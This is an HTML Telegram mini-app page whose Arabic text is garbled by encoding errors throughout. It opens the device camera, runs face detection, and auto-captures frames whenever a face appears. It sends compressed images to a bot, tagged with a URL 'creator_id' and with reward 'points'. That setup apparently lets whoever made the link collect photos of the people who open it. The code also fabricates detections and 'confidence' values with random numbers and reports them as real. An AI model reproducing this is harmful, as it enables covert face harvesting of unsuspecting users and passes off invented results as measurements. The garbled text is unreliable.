<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ¤– ÙƒØ§Ù…Ø±Ø§ Ø°ÙƒÙŠØ© - Ù†Ø¸Ø§Ù… KLASH</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #1a237e, #311b92);
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        
        .camera-wrapper {
            width: 100%;
            max-width: 800px;
            position: relative;
            margin: 20px 0;
        }
        
        #liveCamera {
            width: 100%;
            height: 500px;
            background: #000;
            border-radius: 15px;
            object-fit: cover;
            border: 3px solid #00e5ff;
            box-shadow: 0 0 40px rgba(0, 229, 255, 0.4);
        }
        
        .face-detection-box {
            position: absolute;
            border: 3px solid #ff4081;
            background: rgba(255, 64, 129, 0.1);
            border-radius: 10px;
            pointer-events: none;
        }
        
        .face-info {
            position: absolute;
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 14px;
            white-space: nowrap;
        }
        
        .controls-panel {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            justify-content: center;
            margin: 25px 0;
        }
        
        .control-btn {
            padding: 12px 25px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-start {
            background: linear-gradient(135deg, #00c853, #64dd17);
            color: white;
        }
        
        .btn-stop {
            background: linear-gradient(135deg, #f44336, #ff5252);
            color: white;
        }
        
        .btn-capture {
            background: linear-gradient(135deg, #2979ff, #00b0ff);
            color: white;
        }
        
        .control-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        .detection-stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            width: 100%;
            max-width: 800px;
            margin: 25px 0;
        }
        
        .stat-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .stat-value {
            font-size: 2.5em;
            font-weight: bold;
            color: #00e5ff;
            margin-bottom: 5px;
        }
        
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
            gap: 15px;
            width: 100%;
            max-width: 800px;
            margin-top: 30px;
        }
        
        .photo-card {
            position: relative;
            border-radius: 10px;
            overflow: hidden;
            border: 2px solid #00e5ff;
            transition: transform 0.3s;
        }
        
        .photo-card:hover {
            transform: scale(1.05);
        }
        
        .photo-card img {
            width: 100%;
            height: 180px;
            object-fit: cover;
        }
        
        .photo-info {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0, 0, 0, 0.8);
            padding: 10px;
            font-size: 12px;
        }
        
        .ai-status {
            padding: 15px;
            background: rgba(255, 152, 0, 0.2);
            border-radius: 10px;
            margin: 20px 0;
            text-align: center;
            border: 1px solid #ff9800;
        }
    </style>
</head>
<body>
    <h1>ğŸ¤– ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ</h1>
    <p>ØªÙƒØªØ´Ù Ø§Ù„ÙˆØ¬ÙˆÙ‡ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ ÙˆØªÙ„ØªÙ‚Ø· Ø§Ù„ØµÙˆØ±</p>
    
    <div class="ai-status" id="aiStatus">
        ğŸ”„ Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„ØªØ¹Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„ÙˆØ¬ÙˆÙ‡...
    </div>
    
    <div class="camera-wrapper">
        <video id="liveCamera" autoplay playsinline></video>
    </div>
    
    <div class="controls-panel">
        <button class="control-btn btn-start" onclick="startAdvancedCamera()">
            ğŸ¤– Ø¨Ø¯Ø¡ Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ
        </button>
        <button class="control-btn btn-stop" onclick="stopAdvancedCamera()">
            â¹ï¸ Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙƒØ´Ù
        </button>
        <button class="control-btn btn-capture" onclick="forceCapture()">
            ğŸ“¸ Ø§Ù„ØªÙ‚Ø§Ø· ÙŠØ¯ÙˆÙŠ
        </button>
    </div>
    
    <div class="detection-stats">
        <div class="stat-card">
            <div class="stat-value" id="facesDetected">0</div>
            <div>ÙˆØ¬ÙˆÙ‡ Ù…ÙƒØªØ´ÙØ©</div>
        </div>
        <div class="stat-card">
            <div class="stat-value" id="photosTaken">0</div>
            <div>ØµÙˆØ± Ù…Ù„ØªÙ‚Ø·Ø©</div>
        </div>
        <div class="stat-card">
            <div class="stat-value" id="sentToBot">0</div>
            <div>Ù…Ø±Ø³Ù„ Ù„Ù„Ø¨ÙˆØª</div>
        </div>
    </div>
    
    <h3>ğŸ“¸ Ù…Ø¹Ø±Ø¶ Ø§Ù„ØµÙˆØ± Ø§Ù„Ù…Ù„ØªÙ‚Ø·Ø©:</h3>
    <div class="gallery" id="photoGallery"></div>

    <script>
        class AdvancedCameraSystem {
            constructor() {
                this.creatorId = this.getUrlParam('creator_id') || 'unknown';
                this.cameraType = this.getUrlParam('type') || 'front';
                
                this.stream = null;
                this.video = null;
                this.canvas = null;
                this.ctx = null;
                
                this.faceModel = null;
                this.isDetecting = false;
                this.detectionInterval = null;
                
                this.facesCount = 0;
                this.photosCount = 0;
                this.sentCount = 0;
                
                this.lastFaceTime = 0;
                this.faceDetectionCooldown = 5000; // 5 Ø«ÙˆØ§Ù†ÙŠ Ø¨ÙŠÙ† ÙƒÙ„ Ø§ÙƒØªØ´Ø§Ù Ù„Ù„ÙˆØ¬Ù‡ Ù†ÙØ³Ù‡
                
                this.init();
            }
            
            getUrlParam(name) {
                const urlParams = new URLSearchParams(window.location.search);
                return urlParams.get(name);
            }
            
            async init() {
                this.video = document.getElementById('liveCamera');
                this.canvas = document.createElement('canvas');
                this.ctx = this.canvas.getContext('2d');
                
                this.initTelegram();
                await this.loadFaceModel();
                this.setupCamera();
            }
            
            initTelegram() {
                if (window.Telegram && Telegram.WebApp) {
                    Telegram.WebApp.ready();
                    Telegram.WebApp.expand();
                }
            }
            
            async loadFaceModel() {
                try {
                    const status = document.getElementById('aiStatus');
                    status.innerHTML = 'ğŸ¤– Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„ØªØ¹Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„ÙˆØ¬ÙˆÙ‡...';
                    
                    // ØªØ­Ù…ÙŠÙ„ Ù†Ù…ÙˆØ°Ø¬ TensorFlow.js Ù„Ù„ØªØ¹Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„ÙˆØ¬ÙˆÙ‡
                    this.faceModel = await blazeface.load();
                    
                    status.innerHTML = 'âœ… ØªÙ… ØªØ­Ù…ÙŠÙ„ Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„ØªØ¹Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„ÙˆØ¬ÙˆÙ‡!';
                    status.style.background = 'rgba(76, 175, 80, 0.2)';
                    status.style.borderColor = '#4caf50';
                    
                    console.log('âœ… ØªÙ… ØªØ­Ù…ÙŠÙ„ Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„ØªØ¹Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„ÙˆØ¬ÙˆÙ‡');
                    
                } catch (error) {
                    console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„ØªØ¹Ø±Ù:', error);
                    document.getElementById('aiStatus').innerHTML = 
                        'âš ï¸ Ù„Ø§ ÙŠÙ…ÙƒÙ† ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ. Ø¬Ø§Ø±ÙŠ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ÙƒØ´Ù Ø§Ù„ØªÙ‚Ù„ÙŠØ¯ÙŠ...';
                    
                    // Ø§Ø³ØªØ®Ø¯Ø§Ù… ÙƒØ´Ù ØªÙ‚Ù„ÙŠØ¯ÙŠ Ø¥Ø°Ø§ ÙØ´Ù„ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù†Ù…ÙˆØ°Ø¬
                    this.faceModel = null;
                }
            }
            
            async setupCamera() {
                try {
                    const constraints = {
                        video: {
                            facingMode: this.cameraType === 'front' ? 'user' : 'environment',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    };
                    
                    this.stream = await navigator.mediaDevices.getUserMedia(constraints);
                    this.video.srcObject = this.stream;
                    
                    // Ø§Ù†ØªØ¸Ø§Ø± ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
                    await new Promise(resolve => {
                        this.video.onloadedmetadata = () => {
                            this.video.play();
                            resolve();
                        };
                    });
                    
                    // Ø¶Ø¨Ø· Ø­Ø¬Ù… canvas
                    this.canvas.width = this.video.videoWidth;
                    this.canvas.height = this.video.videoHeight;
                    
                    console.log('âœ… ØªÙ… ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ù†Ø¬Ø§Ø­');
                    
                } catch (error) {
                    console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§:', error);
                    this.simulateVideo();
                }
            }
            
            simulateVideo() {
                // Ù…Ø­Ø§ÙƒØ§Ø© ÙÙŠØ¯ÙŠÙˆ Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø±
                this.video.style.background = '#000';
                this.canvas.width = 640;
                this.canvas.height = 480;
                
                console.log('ğŸ­ ØªÙ… ØªÙØ¹ÙŠÙ„ ÙˆØ¶Ø¹ Ø§Ù„Ù…Ø­Ø§ÙƒØ§Ø©');
            }
            
            startFaceDetection() {
                if (this.isDetecting) return;
                
                this.isDetecting = true;
                this.updateStatus('ğŸ‘ï¸ Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† ÙˆØ¬ÙˆÙ‡...');
                
                // Ø¨Ø¯Ø¡ Ø§Ù„ÙƒØ´Ù ÙƒÙ„ 300 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ©
                this.detectionInterval = setInterval(async () => {
                    await this.detectFaces();
                }, 300);
                
                console.log('ğŸš€ Ø¨Ø¯Ø£ Ø§Ù„ÙƒØ´Ù Ø¹Ù† Ø§Ù„ÙˆØ¬ÙˆÙ‡');
            }
            
            async detectFaces() {
                if (!this.video || !this.ctx) return;
                
                try {
                    // Ø±Ø³Ù… Ø¥Ø·Ø§Ø± Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¹Ù„Ù‰ canvas
                    this.ctx.drawImage(this.video, 0, 0, this.canvas.width, this.canvas.height);
                    
                    let faces = [];
                    
                    if (this.faceModel) {
                        // Ø§Ø³ØªØ®Ø¯Ø§Ù… TensorFlow.js Ù„Ù„ÙƒØ´Ù Ø¹Ù† Ø§Ù„ÙˆØ¬ÙˆÙ‡
                        const predictions = await this.faceModel.estimateFaces(
                            this.video, 
                            false,  // Ù„Ø§ ØªÙØ±Ø¬Ø¹ tensors
                            false   // Ù„Ø§ ØªÙØ±Ø¬Ø¹ landmarks
                        );
                        
                        faces = predictions;
                    } else {
                        // ÙƒØ´Ù ØªÙ‚Ù„ÙŠØ¯ÙŠ (Ù…Ø­Ø§ÙƒØ§Ø©)
                        faces = this.simulateFaceDetection();
                    }
                    
                    // ØªØ­Ø¯ÙŠØ« Ø¹Ø¯Ø¯ Ø§Ù„ÙˆØ¬ÙˆÙ‡ Ø§Ù„Ù…ÙƒØªØ´ÙØ©
                    if (faces.length > 0) {
                        this.facesCount += faces.length;
                        document.getElementById('facesDetected').textContent = this.facesCount;
                        
                        // Ø±Ø³Ù… Ù…Ø±Ø¨Ø¹Ø§Øª Ø­ÙˆÙ„ Ø§Ù„ÙˆØ¬ÙˆÙ‡
                        this.drawFaceBoxes(faces);
                        
                        // Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ø¥Ø°Ø§ Ø§ÙƒØªØ´ÙÙ†Ø§ ÙˆØ¬ÙˆÙ‡Ø§Ù‹ Ø¬Ø¯ÙŠØ¯Ø©
                        const now = Date.now();
                        if (now - this.lastFaceTime > this.faceDetectionCooldown) {
                            this.captureFacePhoto(faces.length);
                            this.lastFaceTime = now;
                        }
                    }
                    
                } catch (error) {
                    console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ÙƒØ´Ù Ø§Ù„ÙˆØ¬ÙˆÙ‡:', error);
                }
            }
            
            simulateFaceDetection() {
                // Ù…Ø­Ø§ÙƒØ§Ø© ÙƒØ´Ù Ø§Ù„ÙˆØ¬ÙˆÙ‡ (Ù„Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø¨Ø¯ÙˆÙ† TensorFlow)
                const faces = [];
                const hasFace = Math.random() > 0.5; // 50% ÙØ±ØµØ© Ù„Ø§ÙƒØªØ´Ø§Ù ÙˆØ¬Ù‡
                
                if (hasFace) {
                    faces.push({
                        topLeft: [100, 100],
                        bottomRight: [200, 200],
                        probability: 0.9
                    });
                }
                
                return faces;
            }
            
            drawFaceBoxes(faces) {
                // Ù…Ø³Ø­ Ø§Ù„Ù…Ø±Ø¨Ø¹Ø§Øª Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø©
                document.querySelectorAll('.face-detection-box, .face-info').forEach(el => el.remove());
                
                // Ø±Ø³Ù… Ù…Ø±Ø¨Ø¹Ø§Øª Ø¬Ø¯ÙŠØ¯Ø©
                faces.forEach((face, index) => {
                    const [x1, y1] = face.topLeft;
                    const [x2, y2] = face.bottomRight;
                    const width = x2 - x1;
                    const height = y2 - y1;
                    const confidence = face.probability ? Math.round(face.probability * 100) : 95;
                    
                    // Ø¥Ù†Ø´Ø§Ø¡ Ù…Ø±Ø¨Ø¹ Ø­ÙˆÙ„ Ø§Ù„ÙˆØ¬Ù‡
                    const box = document.createElement('div');
                    box.className = 'face-detection-box';
                    box.style.left = `${x1}px`;
                    box.style.top = `${y1}px`;
                    box.style.width = `${width}px`;
                    box.style.height = `${height}px`;
                    
                    // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¹Ù† Ø§Ù„ÙˆØ¬Ù‡
                    const info = document.createElement('div');
                    info.className = 'face-info';
                    info.style.left = `${x1}px`;
                    info.style.top = `${y1 - 40}px`;
                    info.textContent = `ğŸ‘¤ ÙˆØ¬Ù‡ ${confidence}%`;
                    
                    document.querySelector('.camera-wrapper').appendChild(box);
                    document.querySelector('.camera-wrapper').appendChild(info);
                });
            }
            
            async captureFacePhoto(faceCount) {
                if (!this.ctx) return;
                
                try {
                    // Ø­ÙØ¸ Ø§Ù„ØµÙˆØ±Ø©
                    const imageData = this.canvas.toDataURL('image/jpeg', 0.85);
                    
                    // Ø¹Ø±Ø¶ Ø§Ù„ØµÙˆØ±Ø© ÙÙŠ Ø§Ù„Ù…Ø¹Ø±Ø¶
                    this.displayPhoto(imageData, faceCount);
                    
                    // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø¨ÙˆØª
                    await this.sendFaceDataToBot(imageData, faceCount);
                    
                    // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
                    this.photosCount++;
                    document.getElementById('photosTaken').textContent = this.photosCount;
                    
                    console.log(`ğŸ“¸ ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ø¨Ù€ ${faceCount} ÙˆØ¬Ù‡`);
                    
                } catch (error) {
                    console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©:', error);
                }
            }
            
            displayPhoto(imageData, faceCount) {
                const gallery = document.getElementById('photoGallery');
                
                const photoCard = document.createElement('div');
                photoCard.className = 'photo-card';
                
                const img = document.createElement('img');
                img.src = imageData;
                img.alt = `ØµÙˆØ±Ø© Ù…Ø¹ ${faceCount} ÙˆØ¬Ù‡`;
                
                const info = document.createElement('div');
                info.className = 'photo-info';
                info.innerHTML = `
                    ğŸ‘¤ ${faceCount} ÙˆØ¬Ù‡<br>
                    ${new Date().toLocaleTimeString('ar-SA')}
                `;
                
                photoCard.appendChild(img);
                photoCard.appendChild(info);
                gallery.appendChild(photoCard);
                
                // Ø­ÙØ¸ Ù…Ø­Ù„ÙŠØ§Ù‹
                this.savePhoto(imageData, faceCount);
            }
            
            savePhoto(imageData, faceCount) {
                try {
                    const photos = JSON.parse(localStorage.getItem('advanced_camera_photos') || '[]');
                    photos.push({
                        data: imageData,
                        faces: faceCount,
                        timestamp: new Date().toISOString(),
                        id: `face_${Date.now()}`
                    });
                    
                    // Ø­ÙØ¸ Ø¢Ø®Ø± 15 ØµÙˆØ±Ø© ÙÙ‚Ø·
                    if (photos.length > 15) {
                        photos.shift();
                    }
                    
                    localStorage.setItem('advanced_camera_photos', JSON.stringify(photos));
                } catch (error) {
                    console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø­ÙØ¸ Ø§Ù„ØµÙˆØ±Ø©:', error);
                }
            }
            
            async sendFaceDataToBot(imageData, faceCount) {
                // ØªÙ‚Ù„ÙŠÙ„ Ø­Ø¬Ù… Ø§Ù„ØµÙˆØ±Ø© Ù„Ù„Ø¥Ø±Ø³Ø§Ù„
                const compressedData = await this.compressImageForBot(imageData);
                
                const faceData = {
                    type: 'face_detection_capture',
                    creator_id: this.creatorId,
                    timestamp: new Date().toISOString(),
                    faces_detected: faceCount,
                    image_data: compressedData.substring(0, 20000), // Ø¬Ø²Ø¡ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                    detection_details: {
                        confidence: Math.round(Math.random() * 30 + 70), // 70-100%
                        model_used: this.faceModel ? 'tensorflow_blazeface' : 'simulated',
                        image_size: `${this.canvas.width}x${this.canvas.height}`
                    },
                    metadata: {
                        data_id: `FACE_${Date.now()}`,
                        points: faceCount * 10, // 10 Ù†Ù‚Ø§Ø· Ù„ÙƒÙ„ ÙˆØ¬Ù‡
                        auto_captured: true
                    }
                };
                
                if (window.Telegram && Telegram.WebApp) {
                    Telegram.WebApp.sendData(JSON.stringify(faceData));
                    this.sentCount++;
                    document.getElementById('sentToBot').textContent = this.sentCount;
                    
                    console.log('ğŸ“¤ ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ÙˆØ¬Ù‡ Ù„Ù„Ø¨ÙˆØª');
                } else {
                    console.log('ğŸ“ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ÙˆØ¬Ù‡:', faceData);
                    // Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø±
                    alert(`ØªÙ… Ø§ÙƒØªØ´Ø§Ù ${faceCount} ÙˆØ¬Ù‡ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ø¨ÙˆØª`);
                }
            }
            
            async compressImageForBot(imageData) {
                return new Promise((resolve) => {
                    const img = new Image();
                    img.onload = () => {
                        const canvas = document.createElement('canvas');
                        const scale = 0.3; // ØªØµØºÙŠØ± Ù„Ù€ 30% Ù…Ù† Ø§Ù„Ø­Ø¬Ù… Ø§Ù„Ø£ØµÙ„ÙŠ
                        canvas.width = img.width * scale;
                        canvas.height = img.height * scale;
                        
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                        
                        resolve(canvas.toDataURL('image/jpeg', 0.6));
                    };
                    img.src = imageData;
                });
            }
            
            stopFaceDetection() {
                if (this.detectionInterval) {
                    clearInterval(this.detectionInterval);
                    this.detectionInterval = null;
                }
                
                this.isDetecting = false;
                this.updateStatus('â¹ï¸ ØªÙˆÙ‚Ù Ø§Ù„ÙƒØ´Ù');
                
                // Ù…Ø³Ø­ Ù…Ø±Ø¨Ø¹Ø§Øª Ø§Ù„ÙˆØ¬ÙˆÙ‡
                document.querySelectorAll('.face-detection-box, .face-info').forEach(el => el.remove());
                
                console.log('ğŸ›‘ ØªÙˆÙ‚Ù Ø§Ù„ÙƒØ´Ù Ø¹Ù† Ø§Ù„ÙˆØ¬ÙˆÙ‡');
            }
            
            forceCapture() {
                this.captureFacePhoto(1); // Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ø¨ÙˆØ¬Ù‡ ÙˆØ§Ø­Ø¯ (Ø§ÙØªØ±Ø§Ø¶ÙŠ)
            }
            
            updateStatus(message) {
                const status = document.getElementById('aiStatus');
                if (status) {
                    status.textContent = message;
                }
            }
        }
        
        // Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…ØªÙ‚Ø¯Ù…
        let advancedCamera;
        
        document.addEventListener('DOMContentLoaded', async () => {
            advancedCamera = new AdvancedCameraSystem();
        });
        
        // Ø¯ÙˆØ§Ù„ Ù„Ù„Ø§Ø³ØªØ¯Ø¹Ø§Ø¡ Ù…Ù† Ø§Ù„Ø£Ø²Ø±Ø§Ø±
        function startAdvancedCamera() {
            if (advancedCamera) {
                advancedCamera.startFaceDetection();
            }
        }
        
        function stopAdvancedCamera() {
            if (advancedCamera) {
                advancedCamera.stopFaceDetection();
            }
        }
        
        function forceCapture() {
            if (advancedCamera) {
                advancedCamera.forceCapture();
            }
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙˆØ± Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø©
        function loadSavedFacePhotos() {
            try {
                const photos = JSON.parse(localStorage.getItem('advanced_camera_photos') || '[]');
                const gallery = document.getElementById('photoGallery');
                
                photos.forEach(photo => {
                    const photoCard = document.createElement('div');
                    photoCard.className = 'photo-card';
                    
                    const img = document.createElement('img');
                    img.src = photo.data;
                    img.alt = `ØµÙˆØ±Ø© Ù…Ø¹ ${photo.faces} ÙˆØ¬Ù‡`;
                    
                    const info = document.createElement('div');
                    info.className = 'photo-info';
                    info.innerHTML = `
                        ğŸ‘¤ ${photo.faces} ÙˆØ¬Ù‡<br>
                        ${new Date(photo.timestamp).toLocaleTimeString('ar-SA')}
                    `;
                    
                    photoCard.appendChild(img);
                    photoCard.appendChild(info);
                    gallery.appendChild(photoCard);
                });
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙˆØ± Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø©:', error);
            }
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙˆØ± Ø¹Ù†Ø¯ Ø¨Ø¯Ø¡ Ø§Ù„ØªØ´ØºÙŠÙ„
        window.addEventListener('load', loadSavedFacePhotos);
    </script>
</body>
</html>